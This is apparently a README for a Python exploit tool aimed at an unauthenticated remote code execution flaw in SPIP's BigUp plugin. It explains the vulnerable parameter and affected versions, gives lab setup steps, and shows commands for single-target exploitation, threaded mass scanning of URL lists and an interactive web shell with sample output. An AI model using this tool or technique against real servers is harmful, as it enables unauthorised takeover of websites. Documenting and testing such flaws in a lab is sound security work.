# 😈 SPIP BigUp Unauthenticated RCE Exploit 😈

## 📜 Description

This Python script takes advantage of a **Remote Code Execution (RCE)** vulnerability in the **BigUp** plugin of **SPIP** (Système de Publication pour l'Internet Partagé). The problem occurs because the `lister_fichiers_par_champs` function does not properly check the data it receives when handling file uploads. When the `bigup_retrouver_fichiers` parameter is set to `1`, the function allows attackers to insert and run harmful PHP code on the server.

What makes this flaw especially dangerous is that it does not require a login or any special permissions, as SPIP does not check who is allowed to use the BigUp feature. This issue affects SPIP versions up to and including **4.3.1**, **4.2.15**, and **4.1.17**.

### 🔥 Vulnerable Versions:
- **SPIP 4.0** to **SPIP 4.3.1**

### 🛡️ Patched Versions:
- **SPIP 4.3.2**, **SPIP 4.2.16**, and **SPIP 4.1.18**

⚠️ **Disclaimer**: Use this tool responsibly and only with explicit permission from the target environment's owner.

## 🚀 Features

- 🔍 **Scan**: Scan single or multiple URLs for vulnerability.
- 💻 **Exploit**: Execute arbitrary commands on vulnerable targets.
- 🐚 **Interactive Shell**: Engage an interactive shell for continuous command execution.
- 💾 **Save Results**: Save vulnerable URLs to an output file.

## 🛠️ Lab Environment Setup

To replicate a vulnerable environment for testing, follow these steps:

### 1. Download and Set Up SPIP

```bash
wget https://files.spip.net/spip/archives/spip-v4.3.1.zip
mkdir spip
mv spip-v4.3.1.zip spip
cd spip
unzip spip-v4.3.1.zip
```

### 2. Launch the SPIP Server

Start a simple PHP server to serve the SPIP installation:

```bash
php -S 0.0.0.0:8000
```

The SPIP site will now be accessible at `http://localhost:8000`.

### 3. Configure SPIP

Navigate to `http://localhost:8000/ecrire` to complete the SPIP installation via the web interface.

## 🛠️ Usage

### 1. Single URL Exploitation

To exploit a single URL, use the following command:

```bash
python exploit.py -u http://example.com
```

### 2. Multiple URLs Scanning

To scan a list of URLs for vulnerabilities, create a text file containing the URLs (one per line) and run:

```bash
python exploit.py -f urls.txt -t 50 -o vulnerable_urls.txt
```

- `-f` specifies the file containing URLs.
- `-t` sets the number of threads for concurrent scanning.
- `-o` specifies the output file to save vulnerable URLs.

### 3. Interactive Shell

If a target is found to be vulnerable, the script automatically drops into an interactive shell where you can execute commands:

```bash
$ python exploit.py -u http://localhost:8000
✅ Target is vulnerable! Command Output: www-data

ℹ️  Interactive shell started. Type `exit` to quit.
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### 4. Using a Proxy

You can route the requests through a proxy by using the `--proxy` option:

```bash
python exploit.py -u http://example.com --proxy http://localhost:8080
```

## ⚠️ Legal Disclaimer

This tool is intended for educational purposes only and should only be used in environments where you have explicit permission to test. The author is not responsible for any misuse of this tool.